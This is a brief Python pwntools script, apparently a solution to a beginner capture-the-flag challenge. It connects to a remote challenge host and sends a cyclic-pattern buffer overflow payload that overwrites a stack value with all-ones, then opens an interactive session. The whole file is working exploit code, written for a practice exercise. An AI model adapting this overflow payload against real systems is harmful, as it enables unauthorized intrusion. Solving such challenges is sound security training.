from pwn import *

#p = process("./beginner-generic-pwn-number-0")
p = remote("mc.ax", 31199)
#input("attach gdb")

p.recv()

payload = cyclic(500)

payload = payload[:cyclic_find("kaaa")]
payload += p64(0xffffffffffffffff)

p.sendline(payload)

p.interactive()
